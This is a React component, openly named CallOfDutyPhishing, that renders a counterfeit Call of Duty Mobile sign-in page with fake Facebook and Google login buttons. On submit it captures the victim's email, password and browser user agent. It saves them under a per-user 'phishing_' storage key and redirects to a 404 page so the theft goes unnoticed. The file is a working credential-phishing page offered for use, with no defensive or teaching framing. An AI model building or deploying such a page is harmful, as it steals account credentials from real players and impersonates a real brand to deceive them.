
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const CallOfDutyPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'Call of Duty',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center">
      <div className="max-w-sm mx-auto px-6">
        <div className="bg-gray-900 border border-yellow-500 rounded-lg p-6 shadow-2xl">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-yellow-500 rounded-lg flex items-center justify-center mx-auto mb-4">
              <span className="text-black text-xl font-bold">⚔️</span>
            </div>
            <h1 className="text-white text-2xl font-bold">CALL OF DUTY</h1>
            <h2 className="text-yellow-400 text-lg font-semibold">MOBILE</h2>
            <p className="text-gray-400 text-sm mt-2">Sign in to your account</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <Input
              type="text"
              placeholder="Email Address"
              value={formData.email}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
              className="w-full h-12 border-2 border-gray-600 rounded bg-gray-800 text-white placeholder-gray-400"
              required
            />
            
            <Input
              type="password"
              placeholder="Password"
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
              className="w-full h-12 border-2 border-gray-600 rounded bg-gray-800 text-white placeholder-gray-400"
              required
            />

            <Button 
              type="submit"
              className="w-full bg-yellow-500 hover:bg-yellow-600 text-black h-12 text-lg font-bold rounded"
            >
              SIGN IN
            </Button>
          </form>

          <div className="text-center mt-6">
            <a href="#" className="text-yellow-400 text-sm">Forgot your password?</a>
          </div>

          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-gray-600"></div>
            <span className="px-4 text-gray-400 text-sm">OR</span>
            <div className="flex-1 border-t border-gray-600"></div>
          </div>

          <div className="space-y-3">
            <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white h-10 font-semibold rounded">
              Continue with Facebook
            </Button>
            <Button className="w-full bg-red-600 hover:bg-red-700 text-white h-10 font-semibold rounded">
              Continue with Google
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CallOfDutyPhishing;
